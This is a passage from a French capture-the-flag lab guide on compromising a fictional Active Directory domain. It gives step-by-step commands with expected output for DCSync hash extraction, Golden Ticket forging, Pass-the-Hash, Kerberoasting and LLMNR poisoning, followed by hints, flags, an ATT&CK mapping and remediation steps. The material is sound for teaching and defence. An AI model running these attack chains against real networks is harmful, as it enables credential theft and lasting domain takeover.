impacket-secretsdump \
    -hashes :<NTLM_ADMIN_HASH> \
    CORPSHADOW/Administrator@10.10.10.10 \
    -just-dc
```

**Explication des variantes :**

| Option | Rôle/Explication |
|--------|------------------|
| `\| grep krbtgt` | Pipeline : filtre la sortie pour ne conserver que la ligne contenant "krbtgt" (le compte cible pour le Golden Ticket) |
| `-just-dc-user jdoe` | Limite l'extraction DCSync à un seul utilisateur (utile pour cibler un compte spécifique sans tout extraire) |
| `-hashes :<NTLM_ADMIN_HASH>` | Authentification par hash NTLM (Pass-the-Hash) au lieu du mot de passe en clair |

#### 5.6.4 Commande Golden Ticket

```bash
# Étape 2 : Forger un Golden Ticket avec impacket-ticketer
# impacket-ticketer crée un TGT (Ticket-Granting Ticket) forgé
# (falsifié) en utilisant le hash NTLM du compte KRBTGT
# Le KRBTGT est le compte qui CHIFFRE tous les TGT du domaine.
# Avec son hash, on peut créer un TGT valide pour N'IMPORTE QUEL utilisateur,
# avec N'IMPORTE QUELS privilèges (groupes), pour une durée arbitraire
impacket-ticketer \
    -nthash <KRBTGT_NT_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain corp.shadow.local \
    -groups 512,519,518 \
    Administrator
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-ticketer` | Outil Impacket qui forge des tickets Kerberos (TGT) avec le hash KRBTGT |
| `-nthash <KRBTGT_NT_HASH>` | **NT Hash** : hash NTLM du compte KRBTGT (récupéré via DCSync) ; c'est la clé qui permet de signer le TGT |
| `-domain-sid <DOMAIN_SID>` | **Domain SID** : Security Identifier du domaine (ex: S-1-5-21-...) ; nécessaire pour construire les RIDs des groupes |
| `-domain corp.shadow.local` | Nom de domaine complet (FQDN) pour lequel le ticket est valide |
| `-groups 512,519,518` | RIDs (Relative Identifiers) des groupes AD : |
| | `512` = **Domain Admins** (accès complet à tout le domaine) |
| | `518` = **Schema Admins** (peut modifier le schéma AD) |
| | `519` = **Enterprise Admins** (accès à toute la forêt) |
| `Administrator` | Nom d'utilisateur pour lequel le ticket est forgé (peut être n'importe quel nom, même inexistant) |

```bash
# Étape 3 : Exporter le ticket dans la session courante
# export KRB5CCNAME définit la variable d'environnement pointant vers le fichier de cache Kerberos
# Linux utilise cette variable pour trouver le ticket Kerberos lors des authentifications
export KRB5CCNAME=/tmp/administrator.ccache

# Étape 4 : Utiliser le ticket forgé pour un accès SMB au DC
# impacket-smbexec avec -k utilise l'authentification Kerberos
# -no-pass : aucun mot de passe nécessaire (l'authentification se fait via le ticket)
# Le ticket forgé (TGT) est utilisé pour demander un TGS pour le service SMB sur DC01
impacket-smbexec \
    -k \
    -no-pass \
    CORPSHADOW/Administrator@DC01.corp.shadow.local
```

**Explication des options Golden Ticket :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `export KRB5CCNAME=/tmp/administrator.ccache` | Variable d'environnement pointant vers le fichier cache Kerberos (`KRB5CCNAME`) ; `export` la rend disponible aux processus enfants |
| `impacket-smbexec -k -no-pass ...` | **SMB Exec** avec `-k` (Kerberos) et `-no-pass` (pas de mot de passe, utilise le ticket) |
| `-k` | **Kerberos** : force l'utilisation de l'authentification Kerberos plutôt que NTLM |
| `-no-pass` | **No password** : n'envoie pas de mot de passe pour l'authentification (utilise le ticket cache) |
| `DC01.corp.shadow.local` | Nom DNS complet du contrôleur de domaine (doit correspondre au SPN enregistré) |

#### 5.6.5 Exécution complète

```bash
# Étape 1 : Récupérer le SID du domaine (nécessaire pour forger le Golden Ticket)
# impacket-lookupsid interroge le DC via SAMR (Security Account Manager Remote)
# pour lister les utilisateurs et groupes, et en déduire le SID du domaine
# grep filtre pour n'afficher que la ligne contenant "Domain SID"
# Le SID est au format S-1-5-21-<valeur numérique>
impacket-lookupsid \
    CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10 \
    | grep "Domain SID"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10` | Outil Impacket qui liste les SID des utilisateurs/groupes ; le pipeline `\| grep` filtre pour ne garder que le SID du domaine |
| `\| grep "Domain SID"` | **Grep** : filtre la sortie pour ne conserver que la ligne contenant "Domain SID" |

```text
Output attendu :
Domain SID: S-1-5-21-1234567890-1234567890-1234567890
```

```bash
# Étape 2 : DCSync — extraire tous les hashes du domaine depuis NTDS.dit
# Utilise DRSUAPI pour répliquer les données AD (simule un DC secondaire)
# Extrait les hash NTLM de TOUS les comptes du domaine
impacket-secretsdump \
    CORPSHADOW/Administrator@10.10.10.10 \
    -just-dc
```

```text
Output attendu (extrait) :
[*] Dumping Domain Credentials (domain:uid:rid:lmhash:nthash)
[*] Using the DRSUAPI to get NTDS secrets   → Utilisation de l'API DRSUAPI
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT_HASH>:::
              → RID 500 = Admin domaine
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NT_HASH>:::
              → RID 502 = Compte KRBTGT (celui qui chiffre les TGT)
CORPSHADOW\jdoe:1001:...:<JDOE_NT_HASH>:::
CORPSHADOW\svc_backup:1002:...:<SVC_BACKUP_HASH>:::
CORPSHADOW\svc_sql:1003:...:<SVC_SQL_HASH>:::
...
[*] Dumping Kerberos keys (krbtgt)
krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>  → Clé AES256 du KRBTGT
krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>  → Clé AES128 du KRBTGT
```

```bash
# Étape 3 : Forger le Golden Ticket avec le hash KRBTGT et le SID du domaine
# On stocke les valeurs dans des variables pour faciliter l'écriture
KRBTGT_HASH="<KRBTGT_NT_HASH>"
DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"

# impacket-ticketer crée un TGT forgé (non valide mais accepté car signé avec KRBTGT)
# Le ticket donne les droits des groupes 512 (Domain Admins), 518 (Schema Admins),
# 519 (Enterprise Admins) pour l'utilisateur Administrator
impacket-ticketer \
    -nthash "$KRBTGT_HASH" \
    -domain-sid "$DOMAIN_SID" \
    -domain corp.shadow.local \
    -groups 512,519,518 \
    Administrator
```

```text
Output attendu :
[*] Creating golden ticket for Administrator@corp.shadow.local
[*] Ticket saved to Administrator.ccache
```

```bash
# Étape 4 : Exporter le ticket forgé dans la session courante
# KRB5CCNAME est la variable d'environnement que Kerberos utilise
# pour trouver le fichier de cache contenant les tickets
export KRB5CCNAME=/tmp/administrator.ccache

# Vérifier le ticket avec klist
# klist affiche les tickets Kerberos dans le cache actuel
# On voit que le ticket est valide pour 10 ans (persistance totale)
klist
```

```text
Ticket cache: FILE:/tmp/administrator.ccache
Default principal: Administrator@corp.shadow.local
Valid starting: 2025-05-30 10:00:00
Expires: 2035-05-28 10:00:00       ← Durée de validité de 10 ans !
```

```bash
# Étape 5 : Accès persistant au contrôleur de domaine
# impacket-smbexec avec -k et -no-pass utilise le ticket forgé
# pour s'authentifier via Kerberos (sans mot de passe ni hash)
# On obtient un shell avec les droits d'administrateur du domaine sur DC01
impacket-smbexec \
    -k \
    -no-pass \
    CORPSHADOW/Administrator@DC01.corp.shadow.local
```

**Explication des commandes de l'exécution complète :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-lookupsid ... \| grep "Domain SID"` | Récupère le SID du domaine via SAMR ; `grep` filtre la sortie pour isoler le SID nécessaire au Golden Ticket |
| `impacket-secretsdump ... -just-dc` | DCSync : extrait tous les hash NTLM du domaine via DRSUAPI, y compris celui du KRBTGT |
| `KRBTGT_HASH="<...>"` | Variable shell stockant le hash KRBTGT (pour lisibilité et réutilisation) |
| `DOMAIN_SID="S-1-5-21-..."` | Variable shell stockant le SID du domaine |
| `impacket-ticketer -nthash "$KRBTGT_HASH" -domain-sid "$DOMAIN_SID" ...` | Forge un TGT pour Administrator avec les groupes Domain Admins (512), Schema Admins (518), Enterprise Admins (519) |
| `export KRB5CCNAME=/tmp/administrator.ccache` | Définit la variable d'environnement pointant vers le cache Kerberos contenant le Golden Ticket |
| `klist` | Affiche les tickets Kerberos dans le cache (vérification) |
| `impacket-smbexec -k -no-pass Administrator@DC01.corp.shadow.local` | Obtient un shell sur DC01 en utilisant le Golden Ticket (authentification Kerberos sans mot de passe) |

#### 5.6.6 Flag attendu

```text
FLAG{Module10_dcsync_u1v2w3x4}
```

#### 5.6.7 Analyse post-exercice — Remédiation

```powershell
# 1. Activer l'audit avancé pour les services d'annuaire AD
# L'événement 4662 est généré lors d'une opération sur un objet AD
# L'opération "GetNCChanges" (GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
# correspond à une requête de réplication DCSync
# auditpol configure les politiques d'audit de sécurité Windows
# /subcategory:"Directory Service Access" : audite l'accès aux objets AD
# /success:enable : journalise les accès réussis
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Auditer les modifications des services d'annuaire
# Détecte les changements dans les objets AD (création, modification, suppression)
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# 2. Restreindre les droits de réplication aux seuls comptes autorisés
# Get-ADObject interroge AD pour trouver les comptes ayant des droits de réplication
# -SearchBase : base de recherche dans la configuration AD
# -Filter : filtre les objets de type "user"
# Where-Object : filtre les comptes avec l'attribut msDS-NeverRevealGroup
Get-ADObject `
    -SearchBase "CN=Configuration,DC=corp,DC=shadow,DC=local" `
    -Filter {ObjectClass -eq "user"} `
    -Properties * | `
    Where-Object { $_.'msDS-NeverRevealGroup' -ne $null }

# 3. Protéger le compte KRBTGT (la clé maîtresse du domaine Kerberos)
# Reset-ADAccountPassword réinitialise le mot de passe du compte KRBTGT
# -Identity : nom du compte (krbtgt)
# -Reset : force la réinitialisation (même si l'utilisateur ne connaît pas l'ancien)
# -NewPassword : nouveau mot de passe (converti en SecureString)
# ATTENTION : changer KRBTGT invalide TOUS les TGT existants dans le domaine
# Il faut le changer DEUX FOIS à 24h d'intervalle pour être certain
# que tous les TGT forgés (Golden Ticket) soient invalidés
Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# 4. Activer le mode de protection étendue pour l'authentification (EPA)
# Extended Protection for Authentication empêche les attaques de relay
# SuppressExtendedProtection = 0 active la protection (ne la supprime pas)
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" `
    -Name "SuppressExtendedProtection" `
    -Value 0
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable` | Active l'audit des accès aux objets AD (événement 4662) pour détecter les opérations de réplication anormales |
| `auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable` | Active l'audit des modifications des services d'annuaire (détection de DCSync) |
| `Get-ADObject -SearchBase "CN=Configuration,..." -Filter {ObjectClass -eq "user"}` | Recherche les comptes utilisateur dans la configuration AD ayant des droits de réplication |
| `Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString ...)` | Réinitialise le mot de passe du KRBTGT (invalide les TGT existants, dont les Golden Tickets) |
| `Set-ItemProperty ... SuppressExtendedProtection -Value 0` | Active la protection étendue pour l'authentification (EPA) contre les attaques de relay |

---

## 6. Workflow ATT&CK complet

### 6.1 Chaîne d'attaque (Kill Chain)

```
Phase 1 : Reconnaissance
├── T1087.002 ── Account Discovery: Domain Account
│   └── bloodhound-python → Flag 1
│
Phase 2 : Accès initial (Credential Access)
├── T1557.001 ── LLMNR/NBT-NS Poisoning
├── T1110.002 ── Password Cracking
│   └── Responder + john → Flag 2
│
Phase 3 : Dump d'identifiants
├── T1003.002 ── SAM Dumping
│   └── impacket-secretsdump → Flag 3
│
Phase 4 : Mouvement latéral
├── T1550.002 ── Pass-the-Hash
│   └── impacket-wmiexec → Flag 4
│
Phase 5 : Élévation de privilèges
├── T1558.003 ── Kerberoasting
│   └── impacket-GetUserSPNs + john → Flag 5
│
Phase 6 : Persistance (Bonus)
├── T1003.006 ── DCSync
├── T1558.001 ── Golden Ticket
│   └── impacket-secretsdump -just-dc + impacket-ticketer → Flag 6
```

### 6.2 Carte mentale des dépendances

```
Flag 1 (BloodHound)
    │
    ▼
Flag 2 (Responder) ← nécessaire : réseau local
    │
    ▼
Identifiants jdoe:P@ssw0rd!2025
    │
    ├────────────────────────────────┐
    ▼                                ▼
Flag 3 (secretsdump)            Flag 5 (Kerberoasting)
    │                                │
    ▼                                ▼
Hash admin local              Mot de passe svc_backup
    │                                │
    ▼                                ▼
Flag 4 (Pass-the-Hash) ←─────┐       │
    │                         │       │
    ▼                         │       │
Accès FS01 + admin domaine    │       │
    │                         │       │
    ▼                         │       │
Flag 6 (DCSync + Golden       │       │
       Ticket) ←──────────────┘       │
    │                                  │
    ▼                                  │
Persistance totale                   ──┘
```

### 6.3 Tableau de bord ATT&CK

| Phase ATT&CK | ID | Technique | Flag | Outil |
|-------------|----|-----------|------|-------|
| TA0043 — Reconnaissance | T1087.002 | Domain Account Discovery | F1 | bloodhound-python |
| TA0006 — Credential Access | T1557.001 | LLMNR/NBT-NS Poisoning | F2 | Responder |
| TA0006 — Credential Access | T1110.002 | Password Cracking | F2 | john |
| TA0006 — Credential Access | T1003.002 | SAM Dumping | F3 | impacket-secretsdump |
| TA0008 — Lateral Movement | T1550.002 | Pass-the-Hash | F4 | impacket-wmiexec |
| TA0006 — Credential Access | T1558.003 | Kerberoasting | F5 | impacket-GetUserSPNs |
| TA0006 — Credential Access | T1003.006 | DCSync | F6 | impacket-secretsdump -just-dc |
| TA0003 — Persistence | T1558.001 | Golden Ticket | F6 | impacket-ticketer |

---

## 7. Indices

### 7.1 Indice 1 — Flag 1 (BloodHound)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** BloodHound utilise LDAP pour interroger l'annuaire. LDAP écoute sur le port 389. Si vous ne spécifiez pas d'utilisateur, l'outil tente une connexion anonyme.

**Commande à vérifier :**

```bash
# Vérifier que le port LDAP (389/TCP) est ouvert sur le contrôleur de domaine
# nmap -p 389 scanne uniquement le port spécifié (rapide)
# Si le port est filtré/fermé, BloodHound ne pourra pas collecter les données
nmap -p 389 10.10.10.10

# Lister les utilisateurs avec ldapsearch (alternative manuelle à BloodHound)
# -x : authentification simple (anonyme)
# -H : URI LDAP (ldap://IP)
# -b : base de recherche (DN du domaine)
# -s sub : scope = subtree (recherche récursive)
# (objectClass=user) : filtre pour les objets utilisateur
# sAMAccountName : attribut à retourner (nom du compte)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=shadow,DC=local" -s sub "(objectClass=user)" sAMAccountName

# Pour BloodHound avec un compte vide (tentative anonyme)
# -u '' : utilisateur vide (connexion anonyme)
# -p '' : mot de passe vide
# Certaines configurations AD autorisent encore l'accès LDAP anonyme
bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all -u '' -p ''
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `nmap -p 389 10.10.10.10` | Scan le port LDAP (389) sur le DC ; `-p` = port spécifique |
| `ldapsearch -x -H ldap://... -b "DC=..." -s sub "(objectClass=user)" sAMAccountName` | Requête LDAP manuelle : `-x` = authentification simple, `-H` = serveur LDAP, `-b` = base de recherche, `-s sub` = recherche récursive, filtre = objets utilisateur, attribut = sAMAccountName |
| `bloodhound-python -u '' -p ''` | Lance BloodHound en mode anonyme (tentative sur configurations non durcies) |

</details>

### 7.2 Indice 2 — Flag 2 (Responder)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** LLMNR est activé par défaut sur Windows 11. Pour déclencher une requête LLMNR, il faut qu'un utilisateur tente de se connecter à une ressource avec un nom qui n'existe pas. Sur le réseau, un script simule cette action. Soyez patient et écoutez le trafic.

**Astuce technique :** Vérifiez que votre interface est en mode promiscuous :

```bash
# Mettre l'interface réseau en mode promiscuous
# Le mode promiscuous permet à la carte réseau de capturer TOUS les paquets
# du segment réseau, pas seulement ceux destinés à notre adresse MAC
# sudo est nécessaire pour la configuration réseau
sudo ip link set eth0 promisc on

# Vérifier le trafic LLMNR (port UDP 5355) en temps réel
# tcpdump capture les paquets réseau et les affiche dans le terminal
# -i eth0 : interface à écouter
# udp port 5355 : filtre UDP sur le port LLMNR
# -n : ne pas résoudre les adresses IP en noms (évite des requêtes DNS supplémentaires)
sudo tcpdump -i eth0 udp port 5355 -n

# Lancer Responder en mode silencieux pour observer le trafic
# -I eth0 : interface réseau
# -v : mode verbeux (affiche chaque requête)
# Observer d'abord permet de voir si LLMNR est actif sur le réseau
sudo responder -I eth0 -v
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `sudo ip link set eth0 promisc on` | Active le mode promiscuous sur eth0 (capture de tout le trafic réseau, pas seulement celui destiné à notre MAC) |
| `sudo tcpdump -i eth0 udp port 5355 -n` | Capture et affiche les paquets LLMNR (UDP 5355) ; `-n` = pas de résolution DNS pour les IP |
| `sudo responder -I eth0 -v` | Lance Responder (empoisonneur LLMNR/NBT-NS) en mode verbeux pour observer les requêtes |

Les logs sont stockés dans `/usr/share/responder/logs/`. Le hash commence par le format : `jdoe::CORPSHADOW:...`

</details>

### 7.3 Indice 3 — Flag 3 (secretsdump)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** secretsdump fait partie d'Impacket. Pour lancer le dump, vous avez besoin d'identifiants valides. Avec le mot de passe de `jdoe`, vous pouvez extraire les hashes SAM de n'importe quelle machine du domaine. Mais toutes les machines n'ont pas le même accès.

**Questions à vous poser :**
- Quelle machine cibler ?
- Le compte `jdoe` est-il administrateur local sur les machines ?
- Sinon, comment contourner l'UAC distant ?

**Solution possible :** Visez le serveur de fichiers FS01 (10.10.10.20). Les serveurs ont souvent une configuration moins restrictive.

```bash
# Tester l'accès SMB sur FS01
# smbclient est un client SMB pour Linux (similaire à net use sur Windows)
# -L : liste les partages disponibles sur le serveur
# //10.10.10.20 : adresse du serveur SMB cible (FS01)
# -U CORPSHADOW/jdoe : utilisateur du domaine pour l'authentification
# Cette commande permet de vérifier que jdoe a bien accès aux partages SMB
smbclient -L //10.10.10.20 -U CORPSHADOW/jdoe
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `smbclient -L //10.10.10.20 -U CORPSHADOW/jdoe` | Liste les partages SMB de FS01 ; `-L` = lister les partages, `//IP` = cible, `-U` = utilisateur pour l'authentification |

</details>

### 7.4 Indice 4 — Flag 4 (Pass-the-Hash)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** Le Pass-the-Hash nécessite un hash NTLM valide. Vous avez extrait de nombreux hashes avec secretsdump. Parmi eux, certains hashs correspondent à des comptes locaux qui pourraient être réutilisés.

**Rappel de la sortie secretsdump :**

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```

- Le RID 500 est TOUJOURS l'administrateur intégré
- Ce hash est peut-être le MÊME sur WS01 et FS01
- Utilisez le format `aad3b435b51404eeaad3b435b51404ee:<NT_HASH>` pour le paramètre `-hashes`

```bash
# Tester le hash de l'administrateur local sur FS01
# Utilise le hash NTLM extrait du SAM (RID 500 = Administrateur intégré)
# Si le même mot de passe admin est utilisé sur WS01 et FS01, le hash sera identique
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrateur@10.10.10.20

# Si ça ne marche pas, essayez avec le compte jdoe (peut-être admin local sur la cible ?)
# Utilise le hash NTLM de jdoe récupéré via secretsdump
impacket-wmiexec -hashes :<JDOE_NT_HASH> CORPSHADOW/jdoe@10.10.10.20
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrateur@10.10.10.20` | Teste le hash de l'admin local sur FS01 (nom français : `Administrateur`) |
| `impacket-wmiexec -hashes :<JDOE_NT_HASH> CORPSHADOW/jdoe@10.10.10.20` | Teste le hash de jdoe (si jdoe est admin local sur FS01) |

</details>

### 7.5 Indice 5 — Flag 5 (Kerberoasting)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** Kerberoasting nécessite de connaître les SPNs du domaine. La commande `GetUserSPNs` liste tous les comptes avec SPN associé. Si vous ne voyez aucun SPN, vérifiez votre connexion au DC.

**Dépannage :**

```bash
# Vérifier la résolution DNS du domaine
# nslookup interroge le serveur DNS (10.10.10.10 = DC01) pour résoudre le nom de domaine
# Si la résolution DNS échoue, Kerberos ne fonctionnera pas correctement
nslookup corp.shadow.local 10.10.10.10

# Vérifier l'authentification Kerberos
# kvno obtient le numéro de version d'une clé Kerberos
# -k : utiliser le keytab (table de clés)
# -t /dev/null : fichier keytab vide (test sans authentification préalable)
# CORPSHADOW/jdoe@CORP.SHADOW.LOCAL : UPN (User Principal Name) du compte
# Si la commande réussit, Kerberos fonctionne
kvno -k -t /dev/null CORPSHADOW/jdoe@CORP.SHADOW.LOCAL

# Tester la connexion LDAP avec authentification
# -H : URI du serveur LDAP
# -D : bind DN (distinguished name) pour l'authentification
# -w : mot de passe en clair
# -b : base de recherche
# "(objectClass=user)" : filtre pour les objets utilisateur
# servicePrincipalName : attribut SPN à retourner
ldapsearch -H ldap://10.10.10.10 -D "CORPSHADOW\jdoe" -w 'P@ssw0rd!2025' -b "DC=corp,DC=shadow,DC=local" "(objectClass=user)" servicePrincipalName
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `nslookup corp.shadow.local 10.10.10.10` | Interroge le DNS (10.10.10.10) pour résoudre le nom de domaine `corp.shadow.local` |
| `kvno -k -t /dev/null CORPSHADOW/jdoe@CORP.SHADOW.LOCAL` | Teste l'authentification Kerberos ; `-k` = utilise un keytab, `-t /dev/null` = keytab vide (test sans credentials) |
| `ldapsearch -H ldap://10.10.10.10 -D "CORPSHADOW\jdoe" -w 'P@ssw0rd!2025' -b "DC=..." "(objectClass=user)" servicePrincipalName` | Requête LDAP authentifiée pour lister les SPN (Service Principal Names) des utilisateurs du domaine |

**Pour le crack :** Le mot de passe du service est dans le dictionnaire `rockyou.txt`. Utilisez le mode hashcat 13100 pour Kerberos 5 TGS-REP.

</details>

### 7.6 Indice 6 — Flag 6 (DCSync + Golden Ticket)

<details>
<summary>Cliquer pour révéler l'indice</summary>

**Indice :** DCSync nécessite un compte avec des privilèges élevés dans le domaine. L'administrateur du domaine a ces droits. Pour le Golden Ticket, vous avez besoin de deux choses :

1. **Le hash NTLM de KRBTGT** (récupéré via DCSync)
2. **Le SID du domaine** (récupéré via `lookupsid`)

```bash
# Si DCSync échoue, vérifiez les droits de votre compte
# DCSync nécessite les droits "Replicating Directory Changes" et
# "Replicating Directory Changes All" sur le domaine
# En général, seuls les membres de "Domain Admins" ont ces droits

# Vérifier les groupes de l'utilisateur jdoe via SMB/RPC
# net rpc group members : liste les membres d'un groupe
# "Domain Admins" : nom du groupe à vérifier
# -W : nom du domaine (Workgroup/domain)
# -I : adresse IP du serveur
# -U : utilisateur pour l'authentification
net rpc group members "Domain Admins" -W corp.shadow.local -I 10.10.10.10 -U jdoe

# Alternative : si vous avez le hash NTLM de l'administrateur du domaine,
# faites un Pass-the-Hash vers le DC, puis exécutez DCSync depuis le DC lui-même
impacket-wmiexec -hashes :<ADMIN_HASH> CORPSHADOW/Administrator@10.10.10.10
```

**Pour le Golden Ticket :** Le SID du domaine commence par `S-1-5-21-`. Utilisez `lookupsid` pour le trouver :

```bash
# Récupérer le SID du domaine via l'outil lookupsid d'Impacket
# lookupsid interroge le contrôleur de domaine via SAMR (Security Account Manager Remote)
# pour lister tous les utilisateurs et groupes avec leurs SID respectifs
# La première ligne de l'output contient le SID du domaine
impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10` | Interroge le DC via SAMR pour lister les SID des utilisateurs et groupes ; la première ligne contient le SID du domaine |

</details>

---

## 8. Template de documentation ATT&CK

### 8.1 Tableau récapitulatif

**Identification et outils :**

| Flag | Technique ATT&CK | ID ATT&CK | Outil |
|------|------------------|-----------|-------|
| **F1** | Domain Account Discovery | T1087.002 | bloodhound-python |
| **F2** | LLMNR/NBT-NS Poisoning | T1557.001 | Responder |
| **F2** | Password Cracking | T1110.002 | john / hashcat |
| **F3** | SAM Dumping | T1003.002 | impacket-secretsdump |
| **F4** | Pass-the-Hash | T1550.002 | impacket-wmiexec |
| **F5** | Kerberoasting | T1558.003 | impacket-GetUserSPNs |
| **F6** | DCSync | T1003.006 | impacket-secretsdump |
| **F6** | Golden Ticket | T1558.001 | impacket-ticketer |

**Commande, impact et remédiation :**

| Flag | Payload / Commande | Impact | Remédiation |
|------|--------------------|--------|-------------|
| **F1** | `bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all` | Cartographie complète du domaine → identification des cibles | Restreindre l'accès LDAP anonyme |
| **F2** | `responder -I eth0 -rdwv` | Capture du hash NTLMv2 de l'utilisateur | Désactiver LLMNR via GPO |
| **F2** | `john --wordlist=rockyou.txt hash.txt` | Mot de passe utilisateur en clair | Politique de mot de passe fort + MFA |
| **F3** | `impacket-secretsdump CORPSHADOW/jdoe:P@ssw0rd!2025@10.10.10.20` | Hashes des comptes locaux et domaine | Credential Guard + LAPS |
| **F4** | `impacket-wmiexec -hashes :<NT_HASH> user@target` | Shell sur machine distante avec droits élevés | LAPS + Mots de passe uniques |
| **F5** | `impacket-GetUserSPNs domain/user:pass -dc-ip DC -request` | Mot de passe du compte de service en clair | Comptes gMSA + AES256 |
| **F6** | `impacket-secretsdump admin@DC -just-dc` | Tous les hashes du domaine (dont KRBTGT) | Surveiller événements 4662 + droits de réplication |
| **F6** | `impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> -domain corp.shadow.local Administrator` | Accès persistant à tout le domaine | Rotation KRBTGT + détection |

### 8.2 Fiche de documentation détaillée (à remplir par l'étudiant)

```markdown
## Fiche de documentation flag ___ (nom : ___)

### Informations générales
- **Date :** ___/___/2025
- **Étudiant :** ___________
- **Flag :** ___
- **Temps passé :** ___ minutes

### Technique ATT&CK
- **ID :** T______
- **Nom :** __________________________________
- **Tactique :** TA______ — __________________
- **Plateforme :** Windows / Linux / AD

### Outils utilisés
- **Outil principal :** ___________
- **Version :** ___________
- **Source :** GitHub / Kali / Autre

### Commande exacte
```bash

```

### Explication
_Pourquoi cette technique fonctionne-t-elle ?_
_______________________________________________
_______________________________________________
_______________________________________________

### Résultat attendu
```
FLAG{...}
```

### Impact sur le client
- **Données compromises :** _________________________________
- **Niveau de criticité :** Critique / Élevé / Moyen / Faible
- **Recommandation NIS2 :** _________________________________

### Remédiation proposée
```powershell
# Code de correction

```

### Références
- MITRE ATT&CK : https://attack.mitre.org/techniques/T___/
- Documentation Microsoft : https://docs.microsoft.com/...
- Outil : https://github.com/...

### Notes personnelles
_______________________________________________
```
---

## 9. Annexes : Corrections et explications

### 9.1 Pourquoi chaque vulnérabilité existe

#### 9.1.1 LLMNR/NBT-NS activé (Flag 2)

**Cause racine :** Microsoft active LLMNR par défaut sur Windows Vista et versions ultérieures pour faciliter la résolution de noms sur les petits réseaux sans DNS. NBT-NS (NetBIOS Name Service) est un héritage de Windows NT. Ces protocoles ne sont pas nécessaires dans un environnement avec DNS Active Directory.

**Risque :** Un attaquant sur le même segment réseau peut empoisonner les réponses et capturer les hashes NTLMv2.

**Solution :** Désactiver LLMNR via GPO et NBT-NS via les paramètres réseau.

#### 9.1.2 Accès SMB sans restriction (Flag 3)

**Cause racine :** Par défaut, Windows autorise les connexions SMB anonymes pour certaines fonctionnalités (partages IPC$, etc.). Le service Remote Registry (permettant l'accès distant aux ruches de registre) est activé par défaut sur les serveurs Windows.

**Risque :** Un attaquant avec un compte utilisateur standard peut extraire les hashes SAM/LSA distants via le registre.

**Solution :** Désactiver le service Remote Registry lorsqu'il n'est pas nécessaire, restreindre l'accès via le pare-feu Windows, activer Credential Guard.

#### 9.1.3 Même administrateur local sur toutes les machines (Flag 4)

**Cause racine :** Absence de LAPS (Local Administrator Password Solution). Les administrateurs configurent souvent le même mot de passe admin local sur toutes les machines pour faciliter la gestion.

**Risque :** Récupération du hash admin sur une machine → compromission de toutes les machines du domaine ayant le même hash.

**Solution :** Déployer LAPS pour gérer des mots de passe uniques par machine.

#### 9.1.4 Compte de service avec SPN et mot de passe faible (Flag 5)

**Cause racine :** Les comptes de service sont souvent créés avec des mots de passe « mémorisables » (donc faibles) et l'option `PasswordNeverExpires` est activée pour éviter les interruptions de service.

**Risque :** Demande d'un TGS pour le SPN → ticket chiffré avec le hash du service → cassé hors ligne.

**Solution :** Utiliser des comptes gMSA (mots de passe gérés automatiquement), ou au minimum des mots de passe de 30+ caractères et un changement régulier.

#### 9.1.5 Droits de réplication non restreints (Flag 6)

**Cause racine :** Les droits de réplication DS (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All) sont accordés aux groupes par défaut. Un compte admin compromis peut les utiliser.

**Risque :** Extraction de la base NTDS.dit contenant tous les hashes du domaine.

**Solution :** Surveiller les événements 4662 (accès aux objets AD), restreindre les droits de réplication, utiliser RODC dans les sites à risque.

### 9.2 Scripts PowerShell de correction

#### 9.2.1 Script de durcissement complet

```powershell
<#
.SYNOPSIS
    Script de durcissement Active Directory pour CorpShadow
    Conforme aux recommandations ANSSI et NIS2
.DESCRIPTION
    Ce script applique les correctifs recommandés suite au test
